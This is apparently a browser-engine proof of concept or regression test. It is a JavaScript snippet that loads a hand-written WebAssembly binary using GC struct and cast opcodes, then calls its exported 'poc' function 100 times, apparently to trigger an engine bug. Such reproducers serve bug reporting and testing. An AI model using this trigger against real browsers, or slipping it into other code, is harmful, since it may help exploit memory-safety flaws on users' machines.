const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,13,1,79,2,94,1,0,127,94,1,1,127,3,2,1,0,7,7,1,3,112,111,99,0,0,10,22,1,20,1,1,251,1,112,65,169,10,251,2,0,33,0,32,0,251,13,1,65,42,251,8,1,0,32,0,251,6,0,0,11]);
const wasm_module = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_module, {});
const f = wasm_instance.exports.poc;
for (let i = 0; i < 100; i++) {
  f();
}